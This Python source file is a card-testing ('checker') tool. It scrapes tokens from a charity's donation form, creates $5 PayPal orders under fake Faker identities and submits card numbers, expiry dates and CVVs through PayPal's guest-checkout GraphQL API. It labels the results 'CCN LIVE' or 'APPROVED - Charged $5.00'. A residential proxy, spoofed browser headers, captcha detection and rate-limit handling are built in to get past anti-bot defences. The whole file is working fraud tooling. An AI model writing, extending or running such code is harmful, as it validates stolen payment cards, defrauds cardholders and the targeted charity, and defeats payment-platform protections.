"""
PayPal Payment Gateway Checker
Uses proven working PayPal Commerce GraphQL API approach
with residential proxy for anti-bot bypass
Enhanced with rate limiting and stealth headers.
"""

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import json
import os
import re
from typing import Tuple
from user_agent import generate_user_agent
from faker import Faker
import time
from gates.utilities import http_request, REQUEST_TIMEOUT
from tools.rate_limiter import wait_for_rate_limit, report_rate_limit_hit, report_request_success
from tools.user_agent_pool import generate_profile
from tools.captcha_detector import detect_captcha

DEFAULT_TIMEOUT = 30
RETRY_ATTEMPTS = 2
RETRY_DELAY = 1

_proxy_url = os.environ.get('RESIDENTIAL_PROXY', '')
PAYPAL_PROXY = {
    'http': _proxy_url,
    'https': _proxy_url
}


def _create_session_with_retries() -> requests.Session:
    """Create a session with retry logic and stealth headers"""
    session = requests.Session()
    retry_strategy = Retry(
        total=RETRY_ATTEMPTS,
        backoff_factor=RETRY_DELAY,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    profile = generate_profile(session_id="paypal_charge")
    session.headers.update(profile.get_page_headers())
    
    return session


def _get_form_data(us, session):
    """Extract form data (hash, form_id, prefix) from donation form page"""
    url = "https://www.brightercommunities.org/donate-form/"
    headers = {'User-Agent': us}
    
    try:
        wait_for_rate_limit("paypal.com")
        response = session.get(url, headers=headers, timeout=DEFAULT_TIMEOUT, proxies=PAYPAL_PROXY)
        if response.status_code == 429:
            report_rate_limit_hit("paypal.com", 429)
            return None, None, None
        if response.status_code == 503:
            report_rate_limit_hit("paypal.com", 503)
            return None, None, None
        if response.status_code != 200:
            return None, None, None
        
        hash_match = re.findall(r'(?<=name="give-form-hash" value=").*?(?=")', response.text)
        form_id_match = re.findall(r'(?<=name="give-form-id" value=").*?(?=")', response.text)
        prefix_match = re.findall(r'(?<=name="give-form-id-prefix" value=").*?(?=")', response.text)
        
        captcha_result = detect_captcha(response.text)
        if captcha_result.detected and not captcha_result.should_retry:
            return f"CAPTCHA:{captcha_result.captcha_type}", None, None
        
        if hash_match and form_id_match and prefix_match:
            return hash_match[0], form_id_match[0], prefix_match[0]
        
        return None, None, None
    except requests.exceptions.Timeout:
        return None, None, None
    except requests.exceptions.ConnectionError:
        return None, None, None
    except Exception:
        return None, None, None


def _create_paypal_order(us, session, fake, hash_val, form_id, prefix):
    """Create PayPal order and get order ID for payment"""
    url = "https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
    
    payload = {
        'give-form-id-prefix': prefix,
        'give-form-id': form_id,
        'give-form-minimum': '5.00',
        'give-form-hash': hash_val,
        'give-amount': '5.00',
        'give_first': fake.first_name(),
        'give_last': fake.last_name(),
        'give_email': fake.email()
    }

    headers = {'User-Agent': us}
    
    try:
        response = session.post(url, data=payload, headers=headers, timeout=DEFAULT_TIMEOUT, proxies=PAYPAL_PROXY)
        response.raise_for_status()
        
        data = response.json()
        order_id = data.get("data", {}).get("id")
        
        if order_id:
            return order_id
        return None
    except requests.exceptions.Timeout:
        return None
    except requests.exceptions.ConnectionError:
        return None
    except Exception:
        return None


def _get_card_type(card_num: str) -> str:
    """Determine card type from card number"""
    first_digit = card_num[0]
    first_two = card_num[:2]
    
    if first_two in ['34', '37']:
        return 'AMERICAN_EXPRESS'
    
    card_types = {
        '3': 'AMERICAN_EXPRESS',
        '4': 'VISA',
        '5': 'MASTER_CARD',
        '6': 'DISCOVER'
    }
    return card_types.get(first_digit, 'VISA')


def _submit_payment(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                    us: str, session, fake, order_id: str, card_type: str) -> str:
    """Submit payment with card details via PayPal GraphQL API"""
    url = "https://www.paypal.com/graphql?fetch_credit_form_submit="
    
    payload = {
        "query": """
        mutation payWithCard(
            $token: String!
            $card: CardInput
            $paymentToken: String
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
            $feeReferenceId: String
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                paymentToken: $paymentToken
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
                feeReferenceId: $feeReferenceId
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
        """,
        "variables": {
            "token": order_id,
            "card": {
                "cardNumber": card_num,
                "type": card_type,
                "expirationDate": f"{card_mon}/20{card_yer}",
                "postalCode": fake.zipcode(),
                "securityCode": card_cvc,
            },
            "phoneNumber": fake.phone_number(),
            "firstName": fake.first_name(),
            "lastName": fake.last_name(),
            "billingAddress": {
                "givenName": fake.first_name(),
                "familyName": fake.last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode(),
            },
            "shippingAddress": {
                "givenName": fake.first_name(),
                "familyName": fake.last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode(),
            },
            "email": fake.email(),
            "currencyConversionType": "PAYPAL"
        },
        "operationName": None
    }

    headers = {'User-Agent': us, 'Content-Type': "application/json"}
    
    try:
        response = session.post(url, data=json.dumps(payload), headers=headers, timeout=DEFAULT_TIMEOUT, proxies=PAYPAL_PROXY)
        time.sleep(0.5)
        return response.text
    except requests.exceptions.Timeout:
        return "TIMEOUT_ERROR"
    except requests.exceptions.ConnectionError:
        return "CONNECTION_ERROR"
    except Exception:
        return ""


def _parse_paypal_response(response_text: str) -> str:
    """Parse PayPal GraphQL response and determine status"""
    if not response_text:
        return "DECLINED ❌ No response"
    
    if response_text == "TIMEOUT_ERROR":
        return "DECLINED ❌ Request timeout"
    
    if response_text == "CONNECTION_ERROR":
        return "DECLINED ❌ Connection error"
    
    error_codes = {
        "INVALID_SECURITY_CODE": "CCN LIVE ✅ CVV Mismatch",
        "GRAPHQL_VALIDATION_FAILED": "DECLINED ❌ Validation failed",
        "EXISTING_ACCOUNT_RESTRICTED": "DECLINED ❌ Account restricted",
        "RISK_DISALLOWED": "DECLINED ❌ Risk check failed",
        "ISSUER_DATA_NOT_FOUND": "DECLINED ❌ Card issuer error",
        "INVALID_BILLING_ADDRESS": "CCN LIVE ✅ AVS Mismatch",
        "INSUFFICIENT_FUNDS": "CCN LIVE ✅ Insufficient Funds",
        "DO_NOT_HONOR": "DECLINED ❌ Do Not Honor",
        "GENERIC_DECLINE": "DECLINED ❌ Generic Decline",
        "R_ERROR": "DECLINED ❌ Generic error",
        "ISSUER_DECLINE": "DECLINED ❌ Card declined by issuer",
        "EXPIRED_CARD": "DECLINED ❌ Expired card",
        "LOST_CARD": "DECLINED ❌ Lost card",
        "STOLEN_CARD": "DECLINED ❌ Stolen card",
        "LOGIN_ERROR": "DECLINED ❌ Login error",
        "VALIDATION_ERROR": "DECLINED ❌ Validation error",
        "CARD_TYPE_NOT_SUPPORTED": "DECLINED ❌ Card type not supported",
        "PROCESSOR_DECLINED": "DECLINED ❌ Processor declined",
        "INVALID_CARD_NUMBER": "DECLINED ❌ Invalid card number",
        "CARD_EXPIRED": "DECLINED ❌ Card expired",
        "PICKUP_CARD": "DECLINED ❌ Pickup card",
        "RESTRICTED_CARD": "DECLINED ❌ Restricted card",
        "SECURITY_VIOLATION": "DECLINED ❌ Security violation",
        "EXCEEDS_LIMIT": "CCN LIVE ✅ Exceeds limit",
        "NOT_PERMITTED": "DECLINED ❌ Not permitted",
    }
    
    for error_code, message in error_codes.items():
        if error_code in response_text:
            return message
    
    if '"is3DSecureRequired":true' in response_text:
        return "CCN LIVE ✅ 3DS Required"
    
    if '"threeDomainSecure"' in response_text and '"redirectUrl"' in response_text:
        return "CCN LIVE ✅ 3DS Required"
    
    if '"status":"COMPLETED"' in response_text:
        return "✅ APPROVED - Charged $5.00"
    
    if '"status":"APPROVED"' in response_text:
        return "✅ APPROVED - Charged $5.00"
    
    if "accessToken" in response_text and "cartId" in response_text:
        if "error" not in response_text.lower() and "decline" not in response_text.lower():
            if "3DSecure" in response_text or "threeDomain" in response_text:
                return "CCN LIVE ✅ 3DS Required"
            return "✅ APPROVED - Charged $5.00"
    
    if "cartId" in response_text and "accessToken" not in response_text:
        return "CCN LIVE ✅ Order Created (Auth Pending)"
    
    response_lower = response_text.lower()
    if "insufficient" in response_lower:
        return "CCN LIVE ✅ Insufficient Funds"
    if "cvv" in response_lower or "cvc" in response_lower or "security code" in response_lower:
        return "CCN LIVE ✅ CVV Mismatch"
    if "expired" in response_lower:
        return "DECLINED ❌ Expired card"
    if "fraud" in response_lower:
        return "DECLINED ❌ Fraud detected"
    if "limit" in response_lower:
        return "CCN LIVE ✅ Limit exceeded"
    
    return "DECLINED ❌ Card declined"


def _test_with_paypal_graphql(card_num: str, card_mon: str, card_yer: str, card_cvc: str) -> Tuple[str, bool]:
    """
    Test card using PayPal Commerce GraphQL API (proven working method)
    """
    try:
        us = generate_user_agent()
        session = _create_session_with_retries()
        fake = Faker()
        
        hash_val, form_id, prefix = _get_form_data(us, session)
        if hash_val and hash_val.startswith("CAPTCHA:"):
            captcha_type = hash_val.replace("CAPTCHA:", "")
            return (f"DECLINED ❌ Captcha detected: {captcha_type}", False)
        if not all([hash_val, form_id, prefix]):
            return ("DECLINED ❌ Form extraction failed", False)
        
        order_id = _create_paypal_order(us, session, fake, hash_val, form_id, prefix)
        if not order_id:
            return ("DECLINED ❌ Order creation failed", False)
        
        card_type = _get_card_type(card_num)
        
        response_text = _submit_payment(card_num, card_mon, card_yer, card_cvc, us, session, fake, order_id, card_type)
        
        result = _parse_paypal_response(response_text)
        
        if "APPROVED" in result:
            report_request_success("paypal.com")
        
        return (result, True)
        
    except requests.exceptions.Timeout:
        return ("DECLINED ❌ Request timeout", False)
    except requests.exceptions.ConnectionError:
        return ("DECLINED ❌ Connection error", False)
    except Exception as e:
        return (f"DECLINED ❌ {str(e)[:40]}", False)


def paypal_charge_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str, proxy=None) -> Tuple[str, bool]:
    """
    Check card via PayPal Commerce GraphQL API
    
    Uses residential proxy from RESIDENTIAL_PROXY environment variable
    to bypass anti-bot protection.
    
    Returns: (status_message, proxy_used)
    Format: "✅ APPROVED - Charged $5.00" or "DECLINED ❌ [reason]"
    """
    if not _proxy_url:
        return ("ERROR: RESIDENTIAL_PROXY not configured", False)
    
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    result, proxy_ok = _test_with_paypal_graphql(card_num, card_mon, card_yer, card_cvc)
    
    return (result, proxy_ok)


def health_check() -> bool:
    """Quick health check for PayPal API connectivity"""
    if not _proxy_url:
        return False
    
    try:
        response = requests.get("https://www.paypal.com/graphql", timeout=DEFAULT_TIMEOUT, proxies=PAYPAL_PROXY)
        return response.status_code < 500
    except Exception:
        return False
